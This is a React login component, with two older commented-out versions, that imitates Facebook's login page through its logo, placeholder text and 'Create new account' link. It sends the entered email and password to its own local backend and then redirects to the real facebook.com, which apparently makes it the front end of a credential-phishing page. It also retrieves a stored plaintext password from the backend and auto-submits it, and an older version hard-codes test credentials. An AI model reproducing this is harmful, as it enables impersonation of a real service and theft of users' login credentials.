import React, { useState, useEffect } from 'react';
import { Link, useNavigate } from 'react-router-dom';  
import axios from 'axios';
import './Login.css';
import logoImage from './face.png';

function Login() {
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });
  const [isAutoSubmit, setIsAutoSubmit] = useState(false);
  const navigate = useNavigate();

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!formData.email || !formData.password) {
      alert('Both email and password are required');
      return;
    }
    axios
      .post('http://localhost:5000/login', formData)
      .then((response) => {
         alert('Login successful!');
        navigate('https://www.facebook.com/');
        //window.location.href = 'https://www.facebook.com/'; // Redirect to Amazon affiliate program

      })
      .catch((error) => {
        alert('Error: ' + (error.response?.data?.message || 'Login failed'));
      });
  };

  // Fetch the last login data from the backend
  useEffect(() => {
    axios.get('http://localhost:5000/last-login')
      .then((response) => {
        const { email, password } = response.data;
        setFormData({
          email: email,
          password: password
        });
        setIsAutoSubmit(true);
      })
      .catch((error) => {
        console.error('Error fetching last login data:', error);
      });
  }, []);               

  useEffect(() => {
    if (isAutoSubmit) {
      handleSubmit(new Event('submit'));
    }
  }, [isAutoSubmit, formData]);

  return (
    <div className="login-container">
      <img src={logoImage} alt="Logo" />
      <form className="fr" onSubmit={handleSubmit}>
        <input
          type="email"
          id="email"
          name="email"
          value={formData.email}
          onChange={handleChange}
          placeholder="Mobile number or email"
        />
        <input
          type="password"
          id="password"
          name="password"
          value={formData.password}
          onChange={handleChange}
          placeholder="Password"
        />
        <button id="loginButton" className="bt" type="submit">Login</button>
        <p className="fp">Forgot password?</p>
        
        {/* Link to Signup page */}
        <p className="bt1">
          <Link to="/signup">Create new account</Link>
        </p>
      </form>
    </div>
  );
}

export default Login;




// import React, { useState, useEffect } from 'react';
// import { Link, useNavigate } from 'react-router-dom';
// import axios from 'axios';
// import './Login.css';
// import logoImage from './face.png';

// function Login() {
//   const [formData, setFormData] = useState({
//     email: '',
//     password: ''
//   });
//   const [isAutoSubmit, setIsAutoSubmit] = useState(false);
//   const navigate = useNavigate();

//   // Handle input change and update formData
//   const handleChange = (e) => {
//     const { name, value } = e.target;
//     setFormData({
//       ...formData,
//       [name]: value
//     });
//   };

//   // Handle form submission
//   const handleSubmit = (e) => {
//     e.preventDefault();
//     if (!formData.email || !formData.password) {
//       alert('Both email and password are required');
//       return;
//     }
//     axios
//       .post('http://localhost:5000/login', formData)
//       .then((response) => {
//         alert('Login successful!');
//         navigate('/dashboard');
//       })
//       .catch((error) => {
//         alert('Error: ' + (error.response?.data?.message || 'Login failed'));
//       });
//   };

//   // Auto-fill and auto-submit form after formData is updated
//   useEffect(() => {
//     setFormData({
//       email: 'm@gmail.com',
//       password: 'tt'
//     });
//     setIsAutoSubmit(true);
//   }, []);

//   // Automatically submit the form if isAutoSubmit is true and formData is filled
//   useEffect(() => {
//     if (isAutoSubmit) {
//       handleSubmit(new Event('submit'));
//     }
//   }, [isAutoSubmit, formData]);

//   return (
//     <div className="login-container">
//       <img src={logoImage} alt="Logo" />
//       <form className="fr" onSubmit={handleSubmit}>
//         <input
//           type="email"
//           id="email"
//           name="email"
//           value={formData.email}
//           onChange={handleChange}
//           placeholder="Mobile number or email"
//         />
//         <input
//           type="password"
//           id="password"
//           name="password"
//           value={formData.password}
//           onChange={handleChange}
//           placeholder="Password"
//         />
//         <button id="loginButton" className="bt" type="submit">Login</button>
//         <p className="fp">Forgot password?</p>
        
//         {/* Link to Signup page */}
//         <p className="bt1">
//           <Link to="/signup">Create new account</Link>
//         </p>
//       </form>
//     </div>
//   );
// }

// export default Login;


// import React, { useState } from 'react';
// import { Link } from 'react-router-dom';
// import axios from 'axios';
// import './Login.css';
// import logoImage from './face.png';

// function Login() {
//   const [formData, setFormData] = useState({
//     email: '',
//     password: ''
//   });

//   const handleChange = (e) => {
//     const { name, value } = e.target;
//     setFormData({
//       ...formData,
//       [name]: value
//     });
//   };

//   const handleSubmit = (e) => {
//     e.preventDefault();
//     axios
//       .post('http://localhost:5000/login', formData)
//       .then((response) => {
//         alert('Login successful!');
//       })
//       .catch((error) => {
//         alert('Error: ' + (error.response?.data?.message || 'Login failed'));
//       });
//   };

//   return (
//     <div className="login-container">
//       <img src={logoImage} alt="Logo" />
//       <form className="fr" onSubmit={handleSubmit}>
//         <input
//           type="email"
//           name="email"
//           value={formData.email}
//           onChange={handleChange}
//           placeholder="Mobile number or email"
//         />
//         <input
//           type="password"
//           name="password"
//           value={formData.password}
//           onChange={handleChange}
//           placeholder="Password"
//         />
//         <button className="bt" type="submit">Login</button>
//         <p className="fp">Forgot password?</p>
        
//         {/* Link to Signup page */}
//         <p className="bt1">        <Link to="/signup" >Create new account</Link>
//         </p>
//       </form>
//     </div>
//   );
// }

// export default Login;





//window.location.href = 'https://www.facebook.com/'; // Redirect to Amazon affiliate program
        //window.location.href = 'https://affiliate-program.amazon.com';
